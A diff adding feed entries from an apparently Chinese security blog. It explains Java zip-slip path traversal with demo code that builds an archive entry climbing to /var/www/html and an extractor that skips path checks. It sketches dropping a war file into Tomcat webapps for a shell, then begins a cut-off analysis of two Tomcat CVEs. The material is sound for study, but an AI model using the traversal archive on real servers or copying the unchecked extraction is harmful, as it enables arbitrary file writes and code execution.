+        <description>&lt;p&gt;前几天有文章(&lt;a href=&quot;https://research.checkpoint.com/parsedroid-targeting-android-development-research-community/&quot;&gt;传送门&lt;/a&gt;)分析了 Apktool 之前版本存在的两个漏洞，其中第二个漏洞是解包 Apk 时通过类似目录遍历的方式把 unknown 中的脚本解压到线上的网站目录从而实现 RCE。这让我想起了之前一篇讲述 Python 中解压文件时的安全问题的文章(&lt;a href=&quot;http://bobao.360.cn/learning/detail/4503.html&quot;&gt;传送门&lt;/a&gt;)，其实 Apktool 这个也是 Java 做文件解压时存在一样的问题了。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x01-demo-代码&quot;&gt;0x01 Demo 代码&lt;/h3&gt;
+
+&lt;p&gt;Java 中做压缩/解压操作代码&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZipTest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.zip.ZipEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.zip.ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.zip.ZipInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.zip.ZipOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * Created by k1n9 on 2017/12/7.
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Demo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;ZipCompressSingleFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;ZipDecompressFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ZipCompressSingleFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getProperty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user.dir&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;ZipOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZipOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Users/k1n9/IdeaProjects/JavaLearn/test.zip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZipEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;../../../../../../../../../../../var/www/html/test.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;zos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putNextEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Users/k1n9/IdeaProjects/JavaLearn/test.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;zos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;zos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ZipDecompressFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./test.zip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;ZipInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zis&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZipInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zipEntry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getNextEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Users/k1n9/IdeaProjects/JavaLearn/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mkdirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;nc&quot;&gt;BufferedOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zipEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;bos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;n&quot;&gt;bos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;zis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;压缩包中恶意文件路径的构造在实例化 ZipEntry 对象的时候，可以传入往上次目录跳这样的路径，这样压缩后的文件效果如下
+&lt;img src=&quot;https://i.loli.net/2017/12/09/5a2b6bb14cbdd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那么在做解压操作时要是没有去验证 ZipEntry 中的文件名是否合法便直接加到路径中写出来的话就会造成文件最终被解压到系统上其它的目录去了。在解压函数中还有一个对父目录的检测的，如果不存在的话就去创建这个父目录，因为真实情况的话往往会创建一个以时间戳来命名的目录再把文件解压到里面去，这里会有个问题，例如&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Users/k1n9/IdeaProjects/JavaLearn/test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;这个是预设中的目标路径，JavaLearn 目录不存在的话便创建一个，这里没啥问题。但是在我们构造一个恶意路径后成了这样&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Users/k1n9/IdeaProjects/JavaLearn/../../../../../../../../../../../var/www/html/test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;这里要是 JavaLearn 目录不存在也不会被创建，由于路径中的 JavaLearn 不存在，在 Linux 文件系统下这样的路径是非法的了，最终会抛出 FileNotFoundException 异常，文件也不会写出来。但是这种情况在 Windows 文件系统中无关系了，一样可以写出来。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x02-如何利用&quot;&gt;0x02 如何利用&lt;/h3&gt;
+
+&lt;p&gt;假如是在 Tomcat 上的话，构造好一个 war 包，路径跳到 webapps。只要解压了，war 包被写到 webapps 目录中，再借助热部署完成 getshell。这只是一个想法了，也可以选择覆盖掉一些配置文件等等。当然要想真正利用还是有前提的：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;已经获取到了目标的路径（默认或者爆破式的猜也是一些选择了）&lt;/li&gt;
+  &lt;li&gt;要是解压路径有加类似时间戳这样的路径就还得考虑目标系统类型了&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Sat, 09 Dec 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2017/12/09/java-sec-in-decompress.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/12/09/java-sec-in-decompress.html</guid>
+        
+        <category>Java</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Tomcat的两个CVE漏洞分析</title>
+        <description>&lt;p&gt;Tomcat 官方在 9 月 19 号公布了两个漏洞 CVE-2017-12616 和 CVE-2017-12615。当启用了虚拟路径，那么虚拟路径中的 jsp 脚本可被攻击者直接获取到源码。当启用了 PUT 方法，可被攻击者上传恶意 jsp 脚本导致代码执行。本文会对漏洞的产生以及官方的修复方法进行分析。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-tomcat-动态调试&quot;&gt;0x00 Tomcat 动态调试&lt;/h2&gt;
+&lt;p&gt;使用动态调试的方式可以很清楚的跟踪漏洞触发的整个流程，下面是对 Tomcat 进行动态调试的配置
+Linux:
+将 bin/startup.sh 拷贝一份为 debug.startup.sh，再将 debug.startup.sh 中的&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;替换成&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export JPDA_TRANSPORT=dt_socket
+export JPDA_ADDRESS=5005
+export JPDA_SUSPEND=y
+exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Windows:
+将 bin/startup.bat 拷贝一份为 debug.startup.bat，再将 debug.startup.bat 中的&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;call &quot;%EXECUTABLE%&quot; start %CMD_LINE_ARGS%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;替换成&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set JPDA_TRANSPORT=dt_socket
+set JPDA_ADDRESS=5005
+set JPDA_SUSPEND=y
+call &quot;%EXECUTABLE%&quot; jpda start %CMD_LINE_ARGS%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;去下载相应版本的 &lt;a href=&quot;https://archive.apache.org/dist/tomcat/&quot;&gt;Tomcat&lt;/a&gt; 源码，然后用 idea 直接把源码导进去就好了，要注意下导入的过程中把 OSGi 的选项给取消了。要是在调试的过程中可能会进入 JDK 的代码中去的话，在设置 JDK 版本的时候要选跟运行着 Tomcat 服务器上一样的。接下来在 idea 添加一个远程调试配置
+&lt;img src=&quot;https://i.loli.net/2017/10/23/59eddb0b08a69.png&quot; alt=&quot;&quot; /&gt;
+Debugger mode 为 Attach，Host 为运行 Tomcat 的地址，Port 根据脚本中的 JPDA_ADDRESS 而定。JPDA_SUSPEND 的值默认为 n，只有下了断点才会暂停 Tomcat。设置为 y 的话，启动 Tomcat 时会一直处于等待状态，直到调试器连接过来。运行用来做调试的脚本来启动 Tomcat 后会显示在监听 5005 端口，此时在 idea 上点击调试就会连接上，再在相应的代码处下断点就可以做调试分析了。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-cve-2017-12616-分析&quot;&gt;0x01 CVE-2017-12616 分析&lt;/h2&gt;
+&lt;p&gt;启用虚拟路径配置：
+conf/server.xml 中的 Host 标签下添加&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Context&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;Resources&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;className=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;org.apache.naming.resources.VirtualDirContext&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;extraResourcePaths=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/test=C:/test&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Context&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;根据 conf/web.xml 中的 servlet-mapping 可以知道除了 url 中匹配到的 *.jsp 和 *.jspx 会交给 JspServlet 来处理，其它的请求，例如静态资源之类的由 DefaultServlet 来处理。&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- The mapping for the default servlet --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;default&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- The mappings for the JSP servlet --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;jsp&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.jsp&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.jspx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
